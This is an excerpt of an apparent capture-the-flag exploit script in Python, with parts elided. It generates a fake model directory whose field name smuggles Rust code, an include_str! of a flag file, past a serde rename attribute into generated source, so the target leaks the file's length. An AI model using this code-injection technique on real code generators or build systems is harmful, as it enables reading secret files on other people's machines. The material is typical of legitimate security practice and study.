...
LEAK_FLAG_LEN = '''")]\nOption2 = include_str!("{flag_path}").len() as isize, #[serde(rename = "some_kek'''
...
def generate_data_spec(path, flag_path):
    ...
    items['num_chars' + LEAK_FLAG_LEN.format(flag_path=flag_path)].index = 1
...
def generate_sploit_tree(path, flag_path):
    generate_forest_header(path)
    generate_data_spec(path, flag_path)
    generate_header(path)
    generate_poc_tree(path, range(1, 50), leak_feature_index=1)
    
def main(path_to_model, flag_path):
    Path(path_to_model).mkdir(parents=True, exist_ok=True)
    generate_sploit_tree(Path(path_to_model), flag_path)
